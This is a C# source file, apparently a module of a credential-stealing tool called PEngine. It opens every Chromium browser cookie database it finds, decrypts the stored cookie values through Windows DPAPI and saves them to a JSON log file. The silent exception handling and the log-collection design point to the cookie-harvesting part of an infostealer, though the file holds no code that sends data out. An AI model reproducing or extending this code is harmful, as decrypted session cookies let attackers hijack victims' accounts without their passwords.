namespace PEngine.Engine.Browsers.Chromium.Cookies
{
    using Newtonsoft.Json;
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.Collections.Generic;
    using System.Data;
    using System.Data.SQLite;
    using System.IO;
    using System.Security.Cryptography;

    public class GetCookies
    {
        private static List<BaseCookies> _Logs = new List<BaseCookies>();

        public static void Inizialize()
        {
            _Logs.Clear();
            for (int i = 0; i < ChromeCookiesSearcher.GetCookies.Count; i++)
            {
                int SafeIndex = i;
                if (File.Exists(ChromeCookiesSearcher.GetCookies[SafeIndex]))
                {
                    try
                    {
                        using (var Connect = new SQLiteConnection($"Data Source={ChromeCookiesSearcher.GetCookies[SafeIndex]};pooling=false"))
                        {
                            Connect.Open();
                            using (var ComText = new SQLiteCommand("SELECT name, encrypted_value, path, expires_utc, last_access_utc, host_key FROM cookies", Connect))
                            {
                                ComText.CommandType = CommandType.Text;
                                using (SQLiteDataReader reader = ComText.ExecuteReader())
                                {
                                    if (!reader.HasRows)
                                    {
                                        continue;
                                    }
                                    else
                                    {
                                        while (reader.Read())
                                        {
                                            _Logs.Add(new BaseCookies
                                            {
                                                Application = Path.GetFileNameWithoutExtension(ChromeCookiesSearcher.GetCookies[SafeIndex]),
                                                HostKey = (string)reader["host_Key"],
                                                Name = (string)reader["Name"],
                                                Path = (string)reader["path"],
                                                Expires_utc = (long)reader["expires_utc"],
                                                Last_access_utc = (long)reader["last_access_utc"],
                                                EncryptedValue = ChromeDecrypt.DecryptValue((byte[])reader["encrypted_value"], DataProtectionScope.LocalMachine)
                                            });
                                        }
                                    }
                                }
                            }
                            SQLiteConnection.ClearPool(Connect);
                        }
                    }
                    catch (SQLiteException) { continue; }
                    catch (FormatException) { continue; }
                    catch (ArgumentException) { continue; }
                    catch (IndexOutOfRangeException) { continue; }
                    catch (DllNotFoundException) { continue; }
                }
            }
            Ccleaner.DeltaLogs("Cookies");
            SaveData.SaveFile(GlobalPath.CookiesLog, JsonConvert.SerializeObject(_Logs, Formatting.Indented));
        }
    }
}